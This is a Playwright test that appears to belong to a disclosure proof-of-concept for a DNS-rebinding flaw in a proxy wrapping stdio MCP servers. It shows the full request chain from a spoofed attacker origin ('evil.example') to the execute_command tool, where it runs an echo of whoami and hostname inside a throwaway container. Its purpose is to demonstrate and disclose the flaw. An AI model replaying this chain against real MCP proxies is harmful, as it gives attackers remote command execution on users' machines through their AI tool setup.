// @ts-check
//
// ESCALATION TEST — only runs when the docker-compose stack is launched
// with `compose.escalation.yml`, which sets ESCALATION_DEMO=1. The
// override also swaps the victim's wrapped stdio MCP from
// mcp-server-time to mcp-server-shell.
//
// What this test proves, on top of the base test.spec.js: the post-
// rebind attacker page can not only invoke `initialize` (which the base
// test confirms), but also drive an actual tool — `execute_command` —
// and read back its output. That collapses the gap between "the
// vulnerability is exploitable" and "the vulnerability is exploitable
// to the full surface of whatever stdio MCP sits behind the proxy."
//
// The shell command we execute is `echo "RCE-PROOF: <user>@<host>"`,
// which prints the victim container's whoami + hostname back through
// the MCP response. Distinctive enough to assert on; harmless on its
// own. The container is throwaway — `docker compose down -v --rmi local`
// removes it.
//
// Do NOT adapt this test to drive any other payload against any other
// proxy. The container-confined demo exists specifically so the
// universal-escalation property is observable without putting any real
// system at risk.

const { test, expect } = require('@playwright/test');

const REBIND_DOMAIN = process.env.REBIND_DOMAIN || 'evil.example';
const REBIND_PORT = parseInt(process.env.REBIND_PORT || '3000', 10);
const ATTACKER_ORIGIN = `http://${REBIND_DOMAIN}:${REBIND_PORT}`;
const MCP_URL = `${ATTACKER_ORIGIN}/mcp`;
const RCE_MARKER = 'RCE-PROOF';

const ENABLED = process.env.ESCALATION_DEMO === '1';

test.describe('escalation: drive execute_command post-rebind', () => {
  test.skip(!ENABLED,
    'Set ESCALATION_DEMO=1 (or run via compose.escalation.yml) to enable.');

  test('attacker-origin POST to tools/call invokes mcp-server-shell', async ({ request }) => {
    test.setTimeout(60000);

    // Step 1 — initialize. Same handshake as test.spec.js, just via the
    // Playwright APIRequestContext rather than a real browser fetch.
    // The attacker nginx forwards Origin: ATTACKER_ORIGIN unchanged to
    // the victim, which mirrors what a real DNS-rebound browser does.
    const initResp = await request.post(MCP_URL, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/event-stream',
        'Origin': ATTACKER_ORIGIN,
      },
      data: {
        jsonrpc: '2.0', id: 1, method: 'initialize',
        params: {
          protocolVersion: '2025-06-18',
          capabilities: {},
          clientInfo: { name: 'dns-rebind-escalation', version: '0' },
        },
      },
    });
    expect(initResp.status(), 'initialize accepted with attacker Origin').toBe(200);
    const sessionId = initResp.headers()['mcp-session-id'];
    expect(sessionId, 'session-id present').toBeTruthy();
    console.log(`[escalation] initialize ok; session=${sessionId}`);

    // Step 2 — initialized notification. The proxy needs this before it
    // will accept tools/* calls per MCP spec.
    await request.post(MCP_URL, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/event-stream',
        'Origin': ATTACKER_ORIGIN,
        'Mcp-Session-Id': sessionId,
      },
      data: {
        jsonrpc: '2.0', method: 'notifications/initialized', params: {},
      },
    });

    // Step 3 — tools/list. Confirms the wrapped server is the shell
    // variant (i.e. the override swapped it in correctly). If we're
    // accidentally pointed at the benign mcp-server-time, this asserts
    // loudly rather than silently passing.
    const listResp = await request.post(MCP_URL, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/event-stream',
        'Origin': ATTACKER_ORIGIN,
        'Mcp-Session-Id': sessionId,
      },
      data: { jsonrpc: '2.0', id: 2, method: 'tools/list', params: {} },
    });
    const listBody = await listResp.text();
    const listJson = extractJsonRpc(listBody);
    const toolNames = (listJson?.result?.tools || []).map(t => t.name);
    console.log(`[escalation] tools/list returned: ${toolNames.join(', ')}`);
    expect(toolNames, 'wrapped server exposes execute_command')
      .toContain('execute_command');

    // Step 4 — tools/call execute_command with a distinctive harmless
    // payload. The RCE marker proves the shell ran inside the victim
    // container. Container is throwaway; no host-side effects.
    const callResp = await request.post(MCP_URL, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/event-stream',
        'Origin': ATTACKER_ORIGIN,
        'Mcp-Session-Id': sessionId,
      },
      data: {
        jsonrpc: '2.0', id: 3, method: 'tools/call',
        params: {
          name: 'execute_command',
          arguments: { command: `echo "${RCE_MARKER}: $(whoami)@$(hostname)"` },
        },
      },
    });
    expect(callResp.status(), 'tools/call accepted with attacker Origin').toBe(200);
    const callBody = await callResp.text();
    console.log(`[escalation] tools/call body (first 240 chars):\n  ${callBody.slice(0, 240).replace(/\n/g, '\n  ')}`);

    // The marker must appear somewhere in the response — RCE-PROOF
    // followed by the container's identity confirms the shell command
    // executed and the output came back to the attacker context.
    expect(callBody, 'RCE marker present in tool-call response').toContain(RCE_MARKER);

    console.log('[escalation] verdict: VULNERABLE — universal escalation confirmed.');
    console.log('[escalation] container-confined; no host-side impact.');
  });
});

function extractJsonRpc(text) {
  for (const line of text.split('\n')) {
    const stripped = line.trim().replace(/^data:\s*/, '');
    if (!stripped) continue;
    try {
      const obj = JSON.parse(stripped);
      if (obj && obj.jsonrpc === '2.0') return obj;
    } catch (_) { /* keep looking */ }
  }
  return null;
}
